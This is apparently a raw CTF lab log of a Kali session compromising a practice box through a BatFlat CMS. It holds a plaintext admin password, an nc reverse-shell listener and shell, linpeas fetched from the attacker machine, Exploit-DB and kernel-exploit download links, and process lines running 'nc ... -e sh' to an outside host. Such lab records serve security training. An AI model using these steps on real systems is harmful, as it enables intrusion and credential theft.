mofo.pwn.		14400	IN	SOA	ns1.mofo.pwn. admin.mofo.pwn. 14 7200 120 2419200 604800
;; Query time: 2 msec
;; SERVER: 127.0.0.11#53(127.0.0.11)
;; WHEN: Thu Jan 26 23:13:48 UTC 2023
;; XFR size: 18 records (messages 1, bytes 467)

newcms.mofo.pwn.	14400	IN	CNAME	durius.mofo.pwn.

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ sudo nano /etc/hosts
                                                                   
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ tail /etc/hosts
10.10.148.212 fire.windcorp.thm
10.10.85.102 selfservice.windcorp.thm
10.10.85.102 selfservice.dev.windcorp.thm
10.10.167.117 team.thm
10.10.167.117 dev.team.thm
10.10.29.100 set.windcorp.thm
10.10.20.190 Osiris.windcorp.thm Osiris osiris.windcorp.thm
10.10.37.31  UNATCO
10.10.73.143 jack.thm
127.0.0.1 newcms.mofo.pwn

http://newcms.mofo.pwn:8888/

──(kali㉿kali)-[~/Downloads/time_flies]
└─$ feroxbuster -t 60 -u http://newcms.mofo.pwn:8888/ -k -w /usr/share/wordlists/dirb/common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://newcms.mofo.pwn:8888/
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[>-------------------] - 1s         1/4614    1h      found:0       errors:0      
[>-------------------] - 2s         2/4614    1h      found:0       errors:0      
[>-------------------] - 3s         3/4614    1h      found:0       errors:0      
[>-------------------] - 4s         4/4614    1h      found:0       errors:0      
200      GET      143l      471w        0c http://newcms.mofo.pwn:8888/
[>-------------------] - 4s         6/4614    1h      found:0       errors:0      
[>-------------------] - 4s         6/4614    1h      found:0       errors:0   
200      GET        1l        4w        0c http://newcms.mofo.pwn:8888/admin

crash it (again)

http://newcms.mofo.pwn:8888/admin/ (BatFlat)

bash-4.4$ cat creds.txt
cat creds.txt
admin:BAraTuwwWzx3gG

login

https://www.exploit-db.com/exploits/49573

Settings>Theme>Hello (PHP PentestMonkey)

https://www.revshells.com/

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ rlwrap nc -lvnp 1337                          
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337

now go to newcms.mofo.pwn:8888/

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ rlwrap nc -lvnp 1337                          
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.214.203.
Ncat: Connection from 10.10.214.203:46396.
Linux Durius 3.16.0-6-amd64 #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) x86_64 GNU/Linux
 18:13:46 up 16 min,  0 users,  load average: 0.00, 0.02, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (425): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Durius:/$ ls -la
ls -la
total 84
drwxr-xr-x  22 root root  4096 Apr 17  2020 .
drwxr-xr-x  22 root root  4096 Apr 17  2020 ..
drwxr-xr-x   2 root root  4096 Apr 17  2020 bin
drwxr-xr-x   3 root root  4096 Apr 23  2020 boot
drwxr-xr-x  15 root root  2820 Jan 26 17:57 dev
drwxr-xr-x  90 root root  4096 Jan 26 17:57 etc
drwxr-xr-x   4 root root  4096 Apr 23  2020 home
lrwxrwxrwx   1 root root    31 Apr 17  2020 initrd.img -> /boot/initrd.img-3.16.0-6-amd64
drwxr-xr-x  14 root root  4096 Apr 17  2020 lib
drwxr-xr-x   2 root root  4096 Apr 17  2020 lib64
drwx------   2 root root 16384 Apr 17  2020 lost+found
drwxr-xr-x   3 root root  4096 Apr 17  2020 media
drwxr-xr-x   2 root root  4096 Apr 17  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 17  2020 opt
dr-xr-xr-x 105 root root     0 Jan 26 17:56 proc
drwx------   4 root root  4096 Apr 23  2020 root
drwxr-xr-x  20 root root   780 Jan 26 17:57 run
drwxr-xr-x   2 root root  4096 Apr 17  2020 sbin
drwxr-xr-x   2 root root  4096 Apr 17  2020 srv
dr-xr-xr-x  13 root root     0 Jan 26 17:56 sys
drwxrwxrwt   7 root root  4096 Jan 26 18:09 tmp
drwxr-xr-x  10 root root  4096 Apr 17  2020 usr
drwxr-xr-x  12 root root  4096 Apr 23  2020 var
lrwxrwxrwx   1 root root    27 Apr 17  2020 vmlinuz -> boot/vmlinuz-3.16.0-6-amd64
www-data@Durius:/$ cd /home
cd /home
www-data@Durius:/home$ ls
ls
benclower
me
www-data@Durius:/home$ cd me
cd me
bash: cd: me: Permission denied
www-data@Durius:/home$ cd benclower
cd benclower
bash: cd: benclower: Permission denied

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ locate linpeas
/home/kali/0day_ctf/linpeas.sh
/home/kali/Downloads/linpeas.sh
/home/kali/hackthebox/linpeas.sh
                                                                                                       
┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ cd /home/kali/0day_ctf/
                                                                                                       
┌──(kali㉿kali)-[~/0day_ctf]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.214.203 - - [26/Jan/2023 19:16:34] "GET /linpeas.sh HTTP/1.1" 200 -

www-data@Durius:/home$ cd /tmp
cd /tmp
www-data@Durius:/tmp$ wget http://10.8.19.103:8000/linpeas.sh
wget http://10.8.19.103:8000/linpeas.sh
converted 'http://10.8.19.103:8000/linpeas.sh' (ANSI_X3.4-1968) -> 'http://10.8.19.103:8000/linpeas.sh' (UTF-8)
--2023-01-26 18:16:34--  http://10.8.19.103:8000/linpeas.sh
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 777018 (759K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  6%  124K 6s
    50K .......... .......... .......... .......... .......... 13%  238K 4s
   100K .......... .......... .......... .......... .......... 19% 4.16M 3s
   150K .......... .......... .......... .......... .......... 26%  268K 2s
   200K .......... .......... .......... .......... .......... 32% 3.33M 2s
   250K .......... .......... .......... .......... .......... 39% 6.38M 1s
   300K .......... .......... .......... .......... .......... 46% 7.15M 1s
   350K .......... .......... .......... .......... .......... 52%  303K 1s
   400K .......... .......... .......... .......... .......... 59% 5.16M 1s
   450K .......... .......... .......... .......... .......... 65% 5.55M 1s
   500K .......... .......... .......... .......... .......... 72% 5.26M 0s
   550K .......... .......... .......... .......... .......... 79% 6.99M 0s
   600K .......... .......... .......... .......... .......... 85% 7.01M 0s
   650K .......... .......... .......... .......... .......... 92% 7.18M 0s
   700K .......... .......... .......... .......... .......... 98%  315K 0s
   750K ........                                              100% 1.65M=1.2s

2023-01-26 18:16:35 (623 KB/s) - 'linpeas.sh' saved [777018/777018]

www-data@Durius:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@Durius:/tmp$ ./linpeas.sh
./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |
    |------------------------------------------------------------------------                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
OS: Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08)
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: Durius
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
                                        ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08)
Distributor ID:	Debian
Description:	Debian GNU/Linux 8.11 (jessie)
Release:	8.11
Codename:	jessie

╔══════════╣ Sudo version
sudo Not Found

╔══════════╣ CVEs Check
./linpeas.sh: 1197: ./linpeas.sh: [[: not found
./linpeas.sh: 1197: ./linpeas.sh: rpm: not found
./linpeas.sh: 1197: ./linpeas.sh: 0: not found

./linpeas.sh: 1207: ./linpeas.sh: [[: not found

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Date & uptime
Thu Jan 26 18:17:03 CST 2023
 18:17:03 up 20 min,  0 users,  load average: 0.28, 0.09, 0.09

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices
UUID=9644d352-b5a4-4557-bc99-59d12b48946c	/	ext4	errors=remount-ro	0 1
UUID=1fadf358-58e7-49b2-b3e4-5090ad71e3c6	none	swap	sw	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
USER=www-data
SHLVL=1
HOME=/var/www
OLDPWD=/home
_=./linpeas.sh
HISTSIZE=0
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-1247] nginxed-root.sh

   Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
   Exposure: probable
   Tags: [ debian=8 ],ubuntu=14.04|16.04|16.10
   Download URL: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
   Comments: Rooting depends on cron.daily (up to 24h of delay). Affected: deb8: <1.6.2; 14.04: <1.4.6; 16.04: 1.10.0; gentoo: <1.10.2-r3

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: less probable
   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-9322] BadIRET

   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
   Exposure: less probable
   Tags: RHEL<=7,fedora=20
   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Tags: ubuntu=(14.04|15.10){kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2015-3290] espfix64_NMI

   Details: http://www.openwall.com/lists/oss-security/2015/08/04/8
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/37722

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: less probable
   Tags: ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic},ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
  [1] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [2] overlayfs
      CVE-2015-8660
      Source: http://www.exploit-db.com/exploits/39230


╔══════════╣ Protections
═╣ AppArmor enabled? .............. AppArmor Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════
                                             ╚═══════════╝
╔══════════╣ Container related tools present
/usr/bin/docker
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
                          ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.1  0.4 110740  5008 ?        Ss   17:56   0:01 /sbin/init
root       141  0.0  0.2  28896  3060 ?        Ss   17:56   0:00 /lib/systemd/systemd-journald
root       145  0.1  0.3  40844  3328 ?        Ss   17:56   0:01 /lib/systemd/systemd-udevd
root       367  0.0  0.7  25404  7736 ?        Ss   17:57   0:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root       399  0.0  0.2  37084  2604 ?        Ss   17:57   0:00 /sbin/rpcbind -w
statd      409  0.0  0.2  37284  2924 ?        Ss   17:57   0:00 /sbin/rpc.statd
  └─(Caps) 0x0000000000000400=cap_net_bind_service
root       423  0.0  0.0  23360   204 ?        Ss   17:57   0:00 /usr/sbin/rpc.idmapd
root       425  0.0  2.4 383288 24584 ?        Ss   17:57   0:00 php-fpm: master process (/etc/php/7.2/fpm/php-fpm.conf)                      
www-data   765  0.0  2.2 459796 22564 ?        S    17:57   0:00  _ php-fpm: pool www                                                            
www-data   766  0.0  2.2 459800 23056 ?        S    17:57   0:00  _ php-fpm: pool www                                                            
www-data  1403  0.0  0.0   4340   772 ?        S    18:13   0:00      _ sh -c uname -a; w; id; bash -i
www-data  1407  0.0  0.3  20228  3188 ?        S    18:13   0:00          _ bash -i
www-data  1412  0.0  0.2   5184  2432 ?        S    18:16   0:00              _ /bin/sh ./linpeas.sh
www-data  4748  0.0  0.0   5184   952 ?        S    18:17   0:00                  _ /bin/sh ./linpeas.sh
www-data  4752  0.0  0.2  17656  2084 ?        R    18:17   0:00                  |   _ ps fauxwww
www-data  4751  0.0  0.0   5184   952 ?        S    18:17   0:00                  _ /bin/sh ./linpeas.sh
daemon[0m     427  0.0  0.1  19028  1672 ?        Ss   17:57   0:00 /usr/sbin/atd -f
root       428  0.0  0.2  27528  2768 ?        Ss   17:57   0:00 /usr/sbin/cron -f
root       430  0.0  0.3 258676  3416 ?        Ssl  17:57   0:00 /usr/sbin/rsyslogd -n
message+   432  0.0  0.3  42248  3464 ?        Ss   17:57   0:00 /usr/bin/dbus-daemon[0m --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
root       438  0.0  0.2  19880  2608 ?        Ss   17:57   0:00 /lib/systemd/systemd-logind
root       454  0.0  0.1   4260  1664 ?        Ss   17:57   0:00 /usr/sbin/acpid
root       458  0.2  7.3 650032 74668 ?        Ssl  17:57   0:02 /usr/bin/dockerd -H fd://
root       822  0.1  3.7 415276 38812 ?        Ssl  17:57   0:01  _ docker-containerd --config /var/run/docker/containerd/containerd.toml
root      1026  0.0  0.4   7500  4416 ?        Sl   17:57   0:00      _ docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon[0m/io.containerd.runtime.v1.linux/moby/ef64b5e754cddbc138fda284da0108f513a116a4ccfc32016a376a2328dc5527 -address /var/run/docker/containerd/docker-containerd.sock -containerd-binary /usr/bin/docker-containerd -runtime-root /var/run/docker/runtime-runc
root      1091  0.0  0.2  11696  2604 ?        Ss+  17:57   0:00      |   _ /bin/bash /usr/sbin/run-vsftpd.sh
root      1286  0.0  0.3  53288  3668 ?        S+   17:57   0:00      |       _ /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf
root      1039  0.0  0.4   7500  4432 ?        Sl   17:57   0:00      _ docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon[0m/io.containerd.runtime.v1.linux/moby/df43dc369c140d1c4cb8ca1bfb71f6dd7092d8fc32fff32fa2fe0b969876ffd1 -address /var/run/docker/containerd/docker-containerd.sock -containerd-binary /usr/bin/docker-containerd -runtime-root /var/run/docker/runtime-runc
statd     1092  0.0  1.8 207856 18652 ?        Ssl+ 17:57   0:00      |   _ /usr/sbin/named -4 -g -u bind -n 1 -c /etc/bind/named.conf
  └─(Caps) 0x0000000000000400=cap_net_bind_service
root      1048  0.0  0.4   7500  4092 ?        Sl   17:57   0:00      _ docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon[0m/io.containerd.runtime.v1.linux/moby/1da62c6e70c5a40a858b19534075c74726626c9f35195ac26923b1cde4ebd826 -address /var/run/docker/containerd/docker-containerd.sock -containerd-binary /usr/bin/docker-containerd -runtime-root /var/run/docker/runtime-runc
root      1105  0.1  1.7  85960 17724 ?        Ss+  17:57   0:01          _ /usr/bin/python2 /usr/bin/supervisord
root      1292  0.0  0.3  13832  3896 ?        S    17:57   0:00              _ nginx: master process /usr/sbin/nginx
systemd+  1294  0.0  0.1  14288  1952 ?        S    17:57   0:00              |   _ nginx: worker process
me        1293  0.1  2.4 110052 25340 ?        S    17:57   0:01              _ /usr/sbin/uwsgi --ini /etc/uwsgi/uwsgi.ini
me        1295  0.0  1.9 110460 19784 ?        S    17:57   0:00                  _ /usr/sbin/uwsgi --ini /etc/uwsgi/uwsgi.ini
me        1307  0.0  0.0   1564     4 ?        S    17:59   0:00                  |   _ /bin/sh -c cat upload/a.txt;nc 168301415 443 -e sh
me        1309  0.0  0.0   1564     4 ?        S    17:59   0:00                  |       _ sh
me        1310  0.0  0.5  12748  6080 ?        S    17:59   0:00                  |           _ python -c import pty;pty.spawn("/bin/bash")
me        1311  0.0  0.1   6348  1976 ?        Ss   17:59   0:00                  |               _ /bin/bash
me        1316  0.0  0.1   1888  1116 ?        Sl+  18:01   0:00                  |                   _ ./shell.elf
me        1296  0.0  1.9 110984 20368 ?        S    17:57   0:00                  _ /usr/sbin/uwsgi --ini /etc/uwsgi/uwsgi.ini
me        1320  0.0  0.0   1564     4 ?        S    18:04   0:00                  |   _ /bin/sh -c cat upload/a.txt;nc 168301415 443 -e sh
me        1322  0.0  0.0   1564     4 ?        S    18:04   0:00                  |       _ sh
me        1324  0.0  0.5  12748  6108 ?        S    18:04   0:00                  |           _ python -c import pty;pty.spawn("/bin/bash")
me        1325  0.0  0.1   6348  1972 ?        Ss+  18:04   0:00                  |               _ /bin/bash
me        1323  0.0  1.9 110104 19440 ?        S    18:04   0:00                  _ /usr/sbin/uwsgi --ini /etc/uwsgi/uwsgi.ini
root       460  0.0  0.5  55204  5432 ?        Ss   17:57   0:00 /usr/sbin/sshd -D
root       513  0.0  0.1  14420  2028 tty1     Ss+  17:57   0:00 /sbin/agetty --noclear tty1 linux
root       514  0.0  0.2  14240  2160 ttyS0    Ss+  17:57   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt102
root       730  0.0  0.3  89560  3148 ?        Ss   17:57   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;
www-data   731  0.0  0.3  89920  3800 ?        S    17:57   0:00  _ nginx: worker process                           
www-data   732  0.0  0.3  89920  3800 ?        S    17:57   0:00  _ nginx: worker process                           
www-data   733  0.0  0.4  90260  4740 ?        S    17:57   0:00  _ nginx: worker process                           
www-data   734  0.0  0.4  90264  4960 ?        S    17:57   0:00  _ nginx: worker process                           
Debian-+   745  0.0  0.3  53308  3284 ?        Ss   17:57   0:00 /usr/sbin/exim4 -bd -q30m

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID  TID             USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd process found (dump creds from memory as root)
apache2 Not Found
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Jun 11  2015 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Apr 22  2020 .
drwxr-xr-x 90 root root 4096 Jan 26 17:57 ..
-rw-r--r--  1 root root  102 Jun 11  2015 .placeholder
-rw-r--r--  1 root root  712 Aug 14  2019 php

/etc/cron.daily:
total 68
drwxr-xr-x  2 root root  4096 Apr 22  2020 .
drwxr-xr-x 90 root root  4096 Jan 26 17:57 ..
-rw-r--r--  1 root root   102 Jun 11  2015 .placeholder
-rwxr-xr-x  1 root root   625 Sep 30  2019 apache2
-rwxr-xr-x  1 root root 15000 Jan 22  2019 apt
-rwxr-xr-x  1 root root   314 Nov  8  2014 aptitude
-rwxr-xr-x  1 root root   355 Oct 17  2014 bsdmainutils
-rwxr-xr-x  1 root root  1597 May  2  2016 dpkg
-rwxr-xr-x  1 root root  4125 Sep  5  2019 exim4-base
-rwxr-xr-x  1 root root    89 Nov  8  2014 logrotate
-rwxr-xr-x  1 root root  1293 Dec 31  2014 man-db
-rwxr-xr-x  1 root root   435 Jun 13  2013 mlocate
-rwxr-xr-x  1 root root   249 May 17  2017 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Apr 17  2020 .
drwxr-xr-x 90 root root 4096 Jan 26 17:57 ..
-rw-r--r--  1 root root  102 Jun 11  2015 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Apr 17  2020 .
drwxr-xr-x 90 root root 4096 Jan 26 17:57 ..
-rw-r--r--  1 root root  102 Jun 11  2015 .placeholder

/etc/cron.weekly:
total 16
